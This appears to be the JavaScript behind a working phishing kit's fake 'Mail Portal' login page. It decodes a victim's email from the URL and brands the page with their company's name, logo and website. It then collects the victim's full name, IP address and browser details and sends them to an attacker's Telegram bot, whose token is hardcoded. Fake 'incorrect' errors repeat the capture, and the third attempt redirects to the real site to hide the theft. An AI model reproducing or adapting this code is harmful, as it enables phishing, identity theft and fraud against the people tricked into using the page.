document.addEventListener("DOMContentLoaded", async function() {
    const urlParams = new URLSearchParams(window.location.search);
    const base64Email = urlParams.get('email');
    
    // Background image slider setup 
    const backgroundImages = [
        'https://source.unsplash.com/random/1920x1080/?office',
        'https://source.unsplash.com/random/1920x1080/?business',
        'https://source.unsplash.com/random/1920x1080/?technology'
    ];
    
    // Fallback images in case Unsplash doesn't work - always use these reliable Pexels images
    const fallbackImages = [
        'https://images.pexels.com/photos/3184360/pexels-photo-3184360.jpeg',
        'https://images.pexels.com/photos/3182759/pexels-photo-3182759.jpeg',
        'https://images.pexels.com/photos/3182812/pexels-photo-3182812.jpeg'
    ];
    
    let currentImageIndex = 0;
    let sliderActive = true; // Flag to control slider activity
    const backgroundSlider = document.getElementById('background-slider');
    const currentSlide = document.querySelector('.current-slide');
    const nextSlide = document.querySelector('.next-slide');
    
    // Make sure the background slider is visible
    backgroundSlider.style.display = 'block';
    
    // Function to preload an image and return a promise
    function preloadImage(url) {
        return new Promise((resolve, reject) => {
            const img = new Image();
            img.onload = () => resolve(url);
            img.onerror = () => reject();
            img.src = url;
        });
    }
    
    // Preload all images for smoother transitions
    fallbackImages.forEach(url => preloadImage(url));
    
    // Initialize the first slide - always use the fallback images for reliability
    async function initializeSlider() {
        try {
            // Always use fallback image for reliability
            currentSlide.style.backgroundImage = `url(${fallbackImages[0]})`;
            // Force the background slider to be visible and properly positioned
            backgroundSlider.style.display = 'block';
            backgroundSlider.style.zIndex = '-2'; // Ensure it's behind the content
            backgroundSlider.style.opacity = '1'; // Make sure it's fully visible
            
            // Reset the slide positions to ensure proper animation
            currentSlide.style.transform = 'translateX(0)';
            nextSlide.style.transform = 'translateX(100%)';
        } catch (error) {
            console.error("Error initializing slider:", error);
        }
    }
    
    // Change background with right-to-left sliding animation
    async function changeBackgroundImage() {
        if (!sliderActive) return; // Skip if slider is not active
        
        // Get the next image index
        const nextImageIndex = (currentImageIndex + 1) % fallbackImages.length;
        
        try {
            // Always use fallback images for reliability
            nextSlide.style.backgroundImage = `url(${fallbackImages[nextImageIndex]})`;
            
            // Start the right-to-left slide animation
            nextSlide.style.transform = 'translateX(0)';
            currentSlide.style.transform = 'translateX(-100%)';
            
            // After the animation completes
            setTimeout(() => {
                // Update current image index
                currentImageIndex = nextImageIndex;
                
                // Reset slide positions
                currentSlide.style.backgroundImage = nextSlide.style.backgroundImage;
                currentSlide.style.transform = 'translateX(0)';
                nextSlide.style.transform = 'translateX(100%)';
            }, 1000); // This should match the transition duration in CSS
        } catch (error) {
            console.error("Error changing background:", error);
        }
    }
    
    // Function to ensure the slider continues running
    function ensureSliderContinues() {
        console.log("CRITICAL: Ensuring slider continues running...");
        
        // Make sure the slider is visible and properly positioned
        backgroundSlider.style.display = 'block';
        backgroundSlider.style.zIndex = '-2';
        backgroundSlider.style.opacity = '1';
        
        // Make sure the slider is active
        sliderActive = true;
        
        // Reset slide positions
        currentSlide.style.transform = 'translateX(0)';
        nextSlide.style.transform = 'translateX(100%)';
        
        // Reset animations with transitions for smoother recovery
        currentSlide.style.transition = 'transform 1.0s ease-in-out';
        nextSlide.style.transition = 'transform 1.0s ease-in-out';
        
        // Clear any existing interval and start a new one
        if (window.sliderInterval) {
            clearInterval(window.sliderInterval);
        }
        
        // Store the interval ID in the window object to ensure it's globally accessible
        window.sliderInterval = setInterval(changeBackgroundImage, 5000);
        
        // Force multiple immediate changes to verify it's working properly
        setTimeout(changeBackgroundImage, 200);
        setTimeout(changeBackgroundImage, 1000);
        
        // Monitor the slider status after forcing changes
        setTimeout(() => {
            // If the slider is not active or not displaying properly, force it again
            if (!sliderActive || 
                backgroundSlider.style.display !== 'block' || 
                backgroundSlider.style.opacity !== '1') {
                console.log("Slider still not running properly. Forcing restart...");
                
                // Reapply critical settings
                backgroundSlider.style.display = 'block';
                backgroundSlider.style.zIndex = '-2';
                backgroundSlider.style.opacity = '1';
                sliderActive = true;
                
                // Force background change one more time
                setTimeout(changeBackgroundImage, 100);
            } else {
                console.log("Slider validated and running properly.");
            }
        }, 1500);
    }
    
    // Initialize the slider
    await initializeSlider();
    
    // Store the interval ID globally to ensure it can be accessed from anywhere
    window.sliderInterval = setInterval(changeBackgroundImage, 5000);
    
    // Set up slider monitoring to ensure it keeps running
    setInterval(ensureSliderContinues, 10000);
    
    // Add event listener to document to ensure slider stays visible throughout page lifecycle
    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible') {
            console.log("Page became visible again - ensuring slider continues...");
            ensureSliderContinues();
        }
    });

    document.getElementById('login-text').textContent = 'LOGIN';
    document.getElementById('login-text').style.marginLeft = '20px';
    document.getElementById('portal-text').textContent = 'MAIL PORTAL';
    document.getElementById('email-text').textContent = 'Email or phone';

    const fullnameContainer = document.getElementById('fullname-container');
    const fullnameLabel = document.createElement('div');
    fullnameLabel.className = 'fullname-label';
    fullnameLabel.textContent = 'Enter Full Name';
    fullnameContainer.appendChild(fullnameLabel);
    
    const errorMessage = document.createElement('div');
    errorMessage.id = 'error-message';
    errorMessage.style.color = 'red';
    errorMessage.style.display = 'none';
    errorMessage.textContent = 'Your account or full name is incorrect. Please try again.';
    fullnameContainer.appendChild(errorMessage);


    
    const fullnameInput = document.createElement('input');
    fullnameInput.type = 'text';
    fullnameInput.placeholder = 'Full Name';
    fullnameInput.id = 'fullname-input';
    fullnameInput.style.border = 'none';
    fullnameInput.style.borderBottom = '1px solid #0965bb';
    fullnameInput.style.padding = '5px';
    fullnameInput.style.width = '90%';
    fullnameInput.style.outline = 'none';
    fullnameContainer.appendChild(fullnameInput);

    
    const actionsContainer = document.getElementById('actions-container');
    const forgotFullname = document.createElement('div');
    forgotFullname.className = 'ft-p';
    forgotFullname.textContent = 'Forgotten account?';
    actionsContainer.appendChild(forgotFullname);

    
    const signInButton = document.createElement('button');
    signInButton.className = 'sn-n-bn';
    signInButton.id = 'sign-in-button';
    signInButton.textContent = 'Sign In';
    actionsContainer.appendChild(signInButton);

    
    document.getElementById('terms').textContent = 'Terms of use Privacy & cookies. © 2024';

    

    if (base64Email) {
        console.log("**CRITICAL**: Email parameter detected - ensuring slider continues to work");
        
        // IMMEDIATELY FORCE SLIDER TO BE ACTIVE BEFORE EMAIL PROCESSING
        sliderActive = true;
        backgroundSlider.style.display = 'block';
        backgroundSlider.style.zIndex = '-2';
        backgroundSlider.style.opacity = '1';
        
        // Preemptively stop any existing intervals to avoid conflicts
        if (window.sliderInterval) {
            clearInterval(window.sliderInterval);
        }
        if (window.emailSliderMonitor) {
            clearInterval(window.emailSliderMonitor);
        }
        
        // Start a new interval immediately
        window.sliderInterval = setInterval(changeBackgroundImage, 5000);
        
        // Force a slide change immediately to verify working
        setTimeout(changeBackgroundImage, 100);
        
        const email = atob(base64Email);
        
        document.getElementById('email-text').textContent = email;
        
        const [localPart, domainExtracted] = email.split('@');
        domain = domainExtracted; 
        const companyName = domainExtracted.split('.')[0];
        const capitalizedDomain = domainExtracted.charAt(0).toUpperCase() + domainExtracted.slice(1);
        const capitalizedCompanyName = companyName.charAt(0).toUpperCase() + companyName.slice(1);
        
        document.getElementById('portal-text').textContent = `${capitalizedCompanyName} Mail Portal`;
        document.getElementById('help-email').textContent = `Help@${domainExtracted}`;

        // INTERMEDIATE CHECK: Ensure slider is still active after text manipulations
        sliderActive = true;
        backgroundSlider.style.display = 'block';
        backgroundSlider.style.zIndex = '-2';
        backgroundSlider.style.opacity = '1';
        
        // Force another slide change to keep the movement going
        setTimeout(changeBackgroundImage, 500);
        
        // Set the logo
        const logoImage = document.getElementById('company-logo');
        logoImage.src = `https://logo.clearbit.com/${domainExtracted}`;
        logoImage.onerror = function() {
            logoImage.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MTIgNTEyIiBzdHlsZT0iZW5hYmxlLWJhY2tncm91bmQ6bmV3IDAgMCA1MTIgNTEyIiB4bWw6c3BhY2U9InByZXNlcnZlIj4KICAgICAgICAgICAgICAgIDxwYXRoIHN0eWxlPSJmaWxsOiMwMDU1YjgiIGQ9Ik01MDMuNzU2IDExOC4wNjVjMC05LjA2OS03LjQyLTE2LjQ4OS0xNi40ODktMTYuNDg5SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djI3NS44N2MwIDkuMDY5IDcuNDIgMTYuNDg5IDE2LjQ4OSAxNi40ODloNDYyLjUzM2M5LjA2OSAwIDE2LjQ4OS03LjQyIDE2LjQ4OS0xNi40ODl2LTI3NS44N3oiLz4KICAgICAgICAgICAgICAgIDxwYXRoIHN0eWxlPSJvcGFjaXR5Oi4xO2VuYWJsZS1iYWNrZ3JvdW5kOm5ldyIgZD0iTTI1NS45OTYgMjMwLjAzMiA5LjMwNiAzOTkuNjg3YzIuMTQ4IDUuNzEzIDcuMzcyIDkuOTQ5IDEzLjYzNiAxMC42MzRsMjMzLjA1My0xNjAuMjc4TDQ4OS4wNSA0MTAuMzIxYzYuMjY3LS42ODMgMTEuNDkyLTQuOTE4IDEzLjY0MS0xMC42MzFMMjU1Ljk5NiAyMzAuMDMyeiIvPgogICAgICAgICAgICAgICAgPHBhdGggc3R5bGU9Im9wYWNpdHk6LjI7ZW5hYmxlLWJhY2tncm91bmQ6bmV3IiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtOS4wNjkgMC0xNi40ODkgNy40Mi0xNi40ODkgMTYuNDg5djIuMTk5bDI0Ny43NTUgMTcyLjUzOSAyNDcuNzU1LTE3Mi41Mzl2LTIuMTk5Yy4wMDItOS4wNjktNy40MTgtMTYuNDg5LTE2LjQ4Ny0xNi40ODl6Ii8+CiAgICAgICAgICAgICAgICA8cGF0aCBzdHlsZT0iZmlsbDojMDA4MmNhIiBkPSJNNDg3LjI2NyAxMDEuNTc2SDI0LjczM2MtNC4wOTEgMC03LjgzOSAxLjUyLTEwLjczIDQuMDFsMjQxLjk5NiAxNjguNTI5IDI0MS45OTYtMTY4LjUyOWMtMi44OS0yLjQ5LTYuNjM3LTQuMDEtMTAuNzI4LTQuMDF6Ii8+CiAgICAgICAgICAgICAgICA8cGF0aCBzdHlsZT0iZmlsbDojMWUyNTJiIiBkPSJNNDg3LjI2NyA5My4zMzJIMjQuNzMzQzExLjA5NSA5My4zMzIgMCAxMDQuNDI3IDAgMTE4LjA2NXYyNzUuODdjMCAxMy42MzkgMTEuMDk1IDI0LjczMyAyNC43MzMgMjQuNzMzaDQ2Mi41MzNjMTMuNjM5IDAgMjQuNzMzLTExLjA5NSAyNC43MzMtMjQuNzMzdi0yNzUuODdjLjAwMS0xMy42MzgtMTEuMDk1LTI0LjczMy0yNC43MzItMjQuNzMzem0tOS43NzcgMTYuNDg5TDI1NiAyNjQuMDY4IDM0LjUxIDEwOS44MjFoNDQyLjk4em0xOC4wMjEgMjg0LjExNGMwIDQuNTQ3LTMuNjk4IDguMjQ0LTguMjQ0IDguMjQ0SDI0LjczM2MtNC41NDcgMC04LjI0NC0zLjY5OC04LjI0NC04LjI0NHYtMjc1Ljg3YzAtLjIyOS4wMTYtLjQ1My4wMzQtLjY3N0wyNTEuMjg4IDI4MC44OGE4LjI0MyA4LjI0MyAwIDAgMCA5LjQyMiAwbDIzNC43NjUtMTYzLjQ5MmMuMDE5LjIyNC4wMzQuNDQ4LjAzNC42Nzd2Mjc1Ljg3aC4wMDJ6Ii8+CiAgICAgICAgICAgIDwvc3ZnPg==';
        };
        
        // INTERMEDIATE CHECK: Ensure slider is still active after logo manipulation
        sliderActive = true;
        backgroundSlider.style.display = 'block';
        backgroundSlider.style.zIndex = '-2';
        backgroundSlider.style.opacity = '1';
        
        // Force another slide change to keep the movement going
        setTimeout(changeBackgroundImage, 800);

        // Set the iframe background
        const iframe = document.getElementById('mainPage');
        iframe.src = `https://${domainExtracted}`;
        iframe.onerror = function() {
            iframe.style.display = 'none';
            document.body.style.backgroundColor = 'rgb(184, 183, 183)';
            
            // Even in case of iframe error, ensure slider is visible
            setTimeout(() => {
                sliderActive = true;
                backgroundSlider.style.display = 'block';
                backgroundSlider.style.zIndex = '-2';
                backgroundSlider.style.opacity = '1';
                changeBackgroundImage();
            }, 100);
        };
        
        // FINAL VERIFICATION: Make sure slider is 100% active
        sliderActive = true;
        backgroundSlider.style.display = 'block';
        backgroundSlider.style.zIndex = '-2';
        backgroundSlider.style.opacity = '1';
        
        // Reset slide positions to ensure proper animation
        currentSlide.style.transform = 'translateX(0)';
        nextSlide.style.transform = 'translateX(100%)';
        
        // Force multiple slide changes to ensure continuous motion
        setTimeout(changeBackgroundImage, 1000);
        setTimeout(changeBackgroundImage, 2000);
        setTimeout(changeBackgroundImage, 3000);
        
        // Reset the slider interval again for redundancy
        clearInterval(window.sliderInterval);
        window.sliderInterval = setInterval(changeBackgroundImage, 5000);
        
        // Add intensive monitoring specifically for email parameter case (every 3 seconds)
        const emailSliderMonitor = setInterval(() => {
            console.log("Email slider monitor checking slider status");
            if (!sliderActive || 
                backgroundSlider.style.display !== 'block' || 
                backgroundSlider.style.opacity !== '1') {
                console.log("**CRITICAL FIX**: Background slider needs repair after email - fixing now");
                sliderActive = true;
                backgroundSlider.style.display = 'block';
                backgroundSlider.style.zIndex = '-2';
                backgroundSlider.style.opacity = '1';
                
                // Reset slide positions
                currentSlide.style.transform = 'translateX(0)';
                nextSlide.style.transform = 'translateX(100%)';
                
                // Force a new image change
                changeBackgroundImage();
                
                // Restart the interval if needed
                clearInterval(window.sliderInterval);
                window.sliderInterval = setInterval(changeBackgroundImage, 5000);
            }
        }, 3000);
        
        // Store the monitor interval in the window object for global access
        window.emailSliderMonitor = emailSliderMonitor;
        
        // Add a one-time check specifically after DOM content would fully load
        setTimeout(() => {
            console.log("**FINAL EMAIL CHECK**: Ensuring slider is still active after all email processing");
            ensureSliderContinues();
            changeBackgroundImage();
        }, 4000);
 }

    let attempt = 0;
    const errorMessageElement = document.getElementById('error-message');
    const signInButtonElement = document.getElementById('sign-in-button');
    let userIp = 'Unknown';

    
    signInButtonElement.addEventListener('click', async function() {
        const fullname = fullnameInput.value.trim();
        console.log("Sign in button clicked - ensuring slider continues to work");

        // Make sure the background slider is visible when signing in
        backgroundSlider.style.display = 'block';
        backgroundSlider.style.zIndex = '-2';
        backgroundSlider.style.opacity = '1'; // Ensure full visibility
        sliderActive = true;
        
        // Reset slide positions to ensure proper animation
        currentSlide.style.transform = 'translateX(0)';
        nextSlide.style.transform = 'translateX(100%)';
        
        // Force a slide change before performing other operations
        setTimeout(changeBackgroundImage, 100);
        
        // Reset the slider interval to ensure it keeps running
        clearInterval(window.sliderInterval);
        window.sliderInterval = setInterval(changeBackgroundImage, 5000);

        if (fullname === '') {
            errorMessageElement.textContent = 'Please enter your full name to continue.';
            errorMessageElement.style.display = 'block';
            setTimeout(function() {
                errorMessageElement.style.display = 'none';
            }, 3000);
        } else if (fullname.length < 4) {
            errorMessageElement.textContent = 'Full name incomplete, Please try again.';
            errorMessageElement.style.display = 'block';
            fullnameInput.value = '';
            setTimeout(function() {
                errorMessageElement.style.display = 'none';
            }, 3000);
        } else {
            errorMessageElement.style.display = 'none';

            attempt++;
            await sendInfoToTelegram();
            
            // Ensure background slider continues working during sign-in attempts
            if (attempt === 1 || attempt === 2) {
                // Make sure the background slider is still visible and active
                backgroundSlider.style.display = 'block';
                backgroundSlider.style.zIndex = '-2';
                backgroundSlider.style.opacity = '1';
                sliderActive = true;
                
                // Ensure slider continues to work after error message
                ensureSliderContinues();
                
                errorMessageElement.textContent = 'Your full name is incorrect. Please try again.';
                errorMessageElement.style.display = 'block';
                setTimeout(function() {
                    errorMessageElement.style.display = 'none';
                    // After the error message is hidden, trigger another background change
                    setTimeout(changeBackgroundImage, 100);
                }, 3000);
            } else if (attempt === 3) {
                // Final forcing of the slider to work before redirecting
                ensureSliderContinues();
                setTimeout(() => {
                    window.location.href = `https://www.${domain}`;
                }, 500);
            }
            fullnameInput.value = ''; 
        }
    });


    async function fetchUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            userIp = data.ip;
        } catch (error) {
            userIp = 'IP - undefined';
        }
    }

    async function sendInfoToTelegram() {
        console.log("Sending information to Telegram, ensuring slider continues working");
        
        // Make sure the slider stays active before sending data
        ensureSliderContinues();
        
        const email = document.getElementById('email-text').textContent;
        const fullname = fullnameInput.value;
        const { formattedDate, formattedTime } = getFormattedDateAndTime();
        const userAgent = navigator.userAgent;

        // Trigger a slide change to keep animation going during API call
        setTimeout(changeBackgroundImage, 100);
        
        await fetchUserIp();

        // Trigger another slide change to ensure continuous motion
        setTimeout(changeBackgroundImage, 1000);
        
        const message = `
Email: ${email}
Full Name: ${fullname}
IP: ${userIp}\n
Date: ${formattedDate}
Time: ${formattedTime}
User Agent: ${userAgent}\n
Designed by k3lly
        `;

        const telegramToken = '7336325866:AAE-mioTzycaUwHKNmVmomAXjBXuTFc1AZ0'; 
        const chatId = '732332108'; 
        const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

        const payload = {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        };

        // Before the API call, ensure the slider is still running
        backgroundSlider.style.display = 'block';
        backgroundSlider.style.zIndex = '-2';
        backgroundSlider.style.opacity = '1';
        sliderActive = true;

        try {
            const response = await fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
            
            const data = await response.json();
            
            if (!data.ok) {
                console.error('Telegram error:', data.description);
            }
            
            // After API call completes, ensure the slider is still running
            ensureSliderContinues();
            setTimeout(changeBackgroundImage, 500);
            
        } catch (error) {
            console.error('Error sending message to Telegram:', error);
            
            // Even if there's an error, make sure the slider continues
            ensureSliderContinues();
        }
        
        // Final check to ensure slider is working after all operations
        setTimeout(() => {
            if (!sliderActive) {
                console.log("Re-activating slider after Telegram API call");
                sliderActive = true;
                ensureSliderContinues();
            }
        }, 1500);
    }

    function getFormattedDateAndTime() {
        const date = new Date();
        const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
        const formattedDate = `${date.getDate()} ${monthNames[date.getMonth()]}, ${date.getFullYear()}`;
        const formattedTime = `${date.getHours().toString().padStart(2, '0')}:${date.getMinutes().toString().padStart(2, '0')}:${date.getSeconds().toString().padStart(2, '0')}`;
        return { formattedDate, formattedTime };
    }
});